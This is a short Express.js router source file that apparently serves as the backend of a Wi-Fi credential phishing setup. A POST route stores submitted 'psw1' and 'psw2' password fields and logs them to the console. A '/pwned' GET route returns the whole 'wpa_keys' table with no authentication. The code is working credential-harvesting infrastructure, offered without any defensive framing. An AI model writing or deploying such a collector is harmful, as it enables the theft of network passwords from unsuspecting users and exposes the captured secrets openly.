const express = require('express');
const router = express.Router();
const query = require('../dbconnect')

class pwned {
    constructor(psw1, psw2) {
        this.psw1 = psw1,
        this.psw2 = psw2
	}
}

router.get('/pwned', async (req, res) => {
    var passwords = await query.GetAllData('*', 'wpa_keys')
    res.json(passwords)
})

router.post('/', async (req, res) => {
    var passwords = new pwned(req.body.psw1, req.body.psw2)
    await query.InsertData(passwords.psw1, passwords.psw2)

    console.log(passwords)
    res.json({
        status: 'Data inserted successfully'
    })
})

router.put('/:id', async (req, res) => {
    console.log(req.params)
    res.json(req.params)
})

module.exports = router;
